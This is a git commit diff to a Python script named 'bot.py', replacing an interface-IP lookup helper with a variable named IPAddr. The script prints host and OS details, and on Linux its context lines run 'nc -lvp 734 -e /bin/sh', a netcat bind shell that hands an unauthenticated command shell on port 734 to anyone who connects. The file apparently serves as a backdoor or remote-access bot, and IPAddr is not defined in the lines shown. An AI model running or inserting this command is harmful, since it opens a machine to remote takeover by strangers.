2f783ee57a902920433dfd48a37ba70ebec8e98b
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 11:49:49 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -5,13 +5,7 @@ import socket
 import fcntl
 import struct
 
-def get_ip_address(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    return socket.inet_ntoa(fcntl.ioctl(
-        s.fileno(),
-        0x8915,  # SIOCGIFADDR
-        struct.pack('256s', ifname[:15])
-    )[20:24])
+
 
 def run():
     hostname=socket.gethostname()   
@@ -26,7 +20,7 @@ def run():
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
-        print(' IpAddress: ', get_ip_address('eth0'))
+        print(' IpAddress: ', IPAddr)
         os.system( 'nc -lvp 734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform()) 
